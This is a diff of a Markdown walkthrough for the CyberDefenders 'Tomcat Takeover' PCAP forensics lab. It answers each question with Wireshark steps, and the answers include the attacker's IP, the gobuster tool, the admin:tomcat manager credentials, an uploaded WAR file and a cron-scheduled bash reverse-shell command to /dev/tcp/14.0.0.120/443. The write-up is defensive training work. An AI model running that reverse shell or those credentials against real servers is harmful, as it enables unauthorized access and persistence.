@@ -1,93 +1,99 @@
-# Tomcat Takeover Lab (CyberDefenders)
+# Tomcat Takeover - PCAP Analysis (CyberDefenders)
 
-## Objective
-Analyze network traffic to identify suspicious access to a Tomcat web server, reconstruct the attack sequence from enumeration to post-exploitation, and determine how the attacker gained administrative access and attempted persistence.
 
 ## Scenario
-The exercise is based on a PCAP containing traffic related to suspicious activity against a Tomcat web server.
-
-The goal is to reconstruct the attacker’s actions by identifying:
-- the external source IP
-- the web server being targeted
-- the enumeration activity
-- the administrative interface discovered
-- the valid credentials used
-- the malicious file upload
-- the post-compromise behavior, including persistence attempts
+The SOC team has identified suspicious activity on a web server within the company's intranet.
+To better understand the situation, they have captured network traffic for analysis.
+The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server.
+Your task is to analyze the PCAP file to understand the scope of the attack.
 
 ## References
-- CyberDefenders: Tomcat Takeover Lab
-- MITRE ATT&CK tactics observed:
-  - Reconnaissance
-  - Credential Access
-  - Privilege Escalation
-  - Persistence
-  - Discovery
-  - Command and Control
+- https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/
 
-## Tools Used
-- Wireshark
-- Statistics → Conversations
-- HTTP packet inspection
-- Follow TCP Stream
-- Display filters
-- Packet details pane
+### Q1 - Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?
 
-## Investigation Workflow
-1. Identified the most active conversations using Statistics → Conversations.
-2. Distinguished internal and external hosts based on observed addressing and communication patterns.
-3. Isolated the suspicious external host communicating with the internal web server.
-4. Filtered HTTP traffic to inspect requests, response codes, and access patterns.
-5. Observed repeated unauthorized access attempts and requests to unusual or administrative paths.
-6. Identified web enumeration activity and extracted the tool name from the HTTP User-Agent.
-7. Confirmed the admin-related directory and the port exposing the administrative functionality.
-8. Inspected authentication-related HTTP headers to identify valid credentials used by the attacker.
-9. Traced the upload request to identify the malicious payload delivery.
-10. Followed the post-upload traffic to reconstruct reverse shell activity and persistence behavior.
+For this question, I went to `Statistics → Endpoints` and focused on the `TCP` view after first sorting the entries by IP address.
+In that view, `14.0.0.120` stood out because it appeared across many different ports, which in the context of the lab strongly suggested scanning activity. 
+At the same time, the `10.x.x.x` side could reasonably be treated as the server side of the communication, and that could also be inferred by giving the dataset traffic a quick review and observing how the communication was structured.
 
-## Key Evidence
-- Suspicious external host:
-  - `14.0.0.120`
-- Internal web server:
-  - `10.0.0.112`
-- Administrative web port:
-  - `8080`
-- Admin-related directory discovered:
-  - `/admin-console`
-- Enumeration tool identified:
-  - `gobuster/3.6`
-- Repeated unauthorized responses observed:
-  - `401 Unauthorized`
-- Successful credential use observed in HTTP authorization data:
-  - `admin:tomcat`
-- Malicious upload endpoint observed:
-  - `POST /manager/html/upload`
+<img width="279" height="399" alt="immagine" src="https://github.com/user-attachments/assets/10d36c0f-645f-42a5-b992-f47e140f05e8" />
 
-## Findings
-- One external host performed targeted HTTP enumeration against the Tomcat server.
-- The traffic showed directory and file discovery activity rather than normal browsing behavior.
-- The attacker located an admin-related path and targeted Tomcat management functionality exposed on port 8080.
-- Multiple unauthorized responses indicated failed or restricted access attempts before valid administrative access was observed.
-- The HTTP authorization data revealed working credentials used to authenticate successfully.
-- After authentication, the attacker uploaded a malicious file consistent with post-exploitation activity.
-- Follow-on traffic indicated execution of the uploaded payload and an attempt to maintain access on the compromised host.
+**Answer:** `14.0.0.120`
 
-## Result
-- Attacker IP: `14.0.0.120`
-- Victim Web Server: `10.0.0.112`
-- Admin Panel Port: `8080`
-- Admin Directory: `/admin-console`
-- Enumeration Tool: `gobuster`
-- Valid Credentials: `admin:tomcat`
-- Attack Pattern: `Web enumeration → admin interface discovery → authentication → malicious upload → shell access → persistence attempt`
+### Q2 - Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?
 
-## Mistakes / Friction Points
-- The exercise was relatively easy because the traffic volume was low and the suspicious HTTP activity stood out quickly.
-- The wording of some questions pushed toward identifying the suspicious host early, even though in a real investigation that would initially remain a working hypothesis rather than a final attribution.
-- It was important to distinguish between early indicators and confirmed conclusions.
+I used the DB-IP Free API to identify the answer.
 
-## Notes
-- In a small PCAP, reading the HTTP Info column directly can be enough to orient the investigation before applying more specific filters.
-- Statistics → Conversations was useful as a triage step, but the real value came from validating the HTTP sequence and request details.
-- The reconstruction worked because the attack chain was visible in order: enumeration, unauthorized access attempts, admin path discovery, authentication, upload, and post-exploitation.
-- In a real case, the same logic would still be useful as triage, but stronger confirmation would be required from a broader timeline and additional logs.
+<img width="772" height="177" alt="immagine" src="https://github.com/user-attachments/assets/a67224ad-2266-499b-9fdd-c53a9585bff6" />
+
+**Answer:** `China`
+
+### Q3 - From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?
+
+For this question, I filtered the traffic with `frame contains "admin"` to isolate requests related to possible administrative paths.
+The **Info** column already showed requests such as `GET /admin` and `GET /admin-console`, and the related traffic was clearly tied to port `8080`. 
+In the context of the lab, that was enough to identify `8080` as the port providing access to the web server admin panel.
+
+<img width="877" height="282" alt="immagine" src="https://github.com/user-attachments/assets/bc966e71-ce7b-481b-b846-eb8b8ff0c0b1" />
+
+**Answer:** `8080`
+
+### Q4 - Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?
+
+Then I opened one of the HTTP packets already shown in the first screenshot and checked its details. 
+The `User-Agent` field was visible there and showed `gobuster/3.6`, which was enough to identify `gobuster` as the enumeration tool.
+
+<img width="362" height="201" alt="immagine" src="https://github.com/user-attachments/assets/2217026a-53a1-423b-81ce-b71921c30445" />
+
+**Answer:** `gobuster`
+
+### Q5 - After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?
+
+For this question, I filtered the traffic with `ip.src == 14.0.0.120 && http` so I could focus only on the attacker’s HTTP activity. 
+After the earlier enumeration phase, I expected that any useful administrative path would reappear in the requests once the attacker moved from discovery to actual interaction.
+In that filtered HTTP sequence, `/manager` appeared repeatedly and then led into more specific requests such as `/manager/html` and the later authenticated `POST` activity.
+That made it clear that `/manager` was the administrative directory the attacker had uncovered, while the surrounding requests confirmed that it was not just an isolated probe but part of the real admin-panel workflow.
+
+<img width="1556" height="1006" alt="immagine" src="https://github.com/user-attachments/assets/7416cf1e-92d8-4c6e-96b4-bcbca635b6b7" />
+
+**Answer:** `/manager`
+
+### Q6 - After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?
+
+Now the focus can move to the lower part of the same screenshot, where the HTTP packet details are visible. 
+In that section, the `Authorization` header is present, and Wireshark directly shows the decoded value as `Credentials: admin:tomcat`, which gives the answer.
+
+**Answer:** `admin:tomcat`
+
+### Q7 - Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?
+
+At this point, the natural thing to do was to use `Follow HTTP Stream` on the suspicious `POST` request we had already identified.
+Once opened, the upload content was much easier to read, and the `filename` field was right there, exposing `JXQOZY.war` directly.
+
+<img width="516" height="289" alt="immagine" src="https://github.com/user-attachments/assets/5afc208b-e1e8-46bb-b685-80e5e2f6cedc" />
+
+**Answer:** `JXQOZY.war`
+
+### Q8 - After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?
+
+For this question, I narrowed the scope by thinking about what the prompt was really asking: a command used for both reverse-shell access and persistence. 
+Once framed that way, the number of plausible commands became much smaller, because the attacker would likely need something related to scheduled execution rather than just one-off command execution.
+For that reason, I filtered the attacker’s traffic with `ip.src == 14.0.0.120 && frame contains "crontab"`, since `crontab` was one of the most natural strings to look for if the goal was to maintain access over time.
+
+<img width="582" height="102" alt="immagine" src="https://github.com/user-attachments/assets/9e70f3c7-f3c3-4571-bb10-b3e48f1a8ed0" />
+
+That search produced two packets, which already suggested that the term had appeared inside a meaningful command sequence rather than by accident.
+At that point, I opened one of those packets with `Follow TCP Stream`. 
+That was the most useful next step here, because it exposed the full stream content instead of only the single packet, making it possible to read the commands in sequence from the first one to the last one typed by the attacker.
+From that stream, the scheduled persistence command could be identified directly as `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`.
+
+<img width="583" height="238" alt="immagine" src="https://github.com/user-attachments/assets/a80c6982-7738-42c5-aecb-202c34302b0b" />
+
+> [!NOTE]
+> Since the question was asking about both a reverse shell and persistence, the most plausible hypotheses were commands related to scheduled execution rather than simple one-time command execution.
+> The strongest candidates were `cron`, `crontab`, `at`, or direct modifications to files such as `/etc/crontab` or `/var/spool/cron/...`.
+> I chose to search for `crontab` first because it was the most natural and specific fit for a persistence mechanism on Linux after doing the necessary background research online.
+
+
+
+**Answer:** `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`
